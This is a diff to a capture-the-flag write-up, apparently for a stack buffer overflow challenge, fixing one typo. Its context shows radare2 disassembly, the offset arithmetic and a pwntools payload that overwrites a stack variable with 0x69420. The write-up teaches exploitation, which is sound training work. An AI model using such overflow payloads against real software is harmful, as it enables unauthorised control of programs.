@@ -43,7 +43,7 @@ Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then en
             0x5621860071e9      0f1f80000000.  nop dword [rax]                                                                                                                                                                                
             ; DATA XREF from entry0 @ 0x5621860070ba    
 ```           
-Here we notice that ```rbp-0x110``` is what we need to focus on and then overwrite ```rbp-0x4``` with 0x69420. So we subtract ```0x4``` from ```0x110*``` which gives us ```272-4=268```
+Here we notice that ```rbp-0x110``` is what we need to focus on and then overwrite ```rbp-0x4``` with 0x69420. So we subtract ```0x4``` from ```0x110``` which gives us ```272-4=268```
 
 We hop on to ipython3 and ```from pwn import *``` and create a process with ```p = process ("./a.out")``` and send the junk to fill the space provided along with the new value we want to compare with ```p.sendline(b'A' * 268 + p32(0x69420))```
 
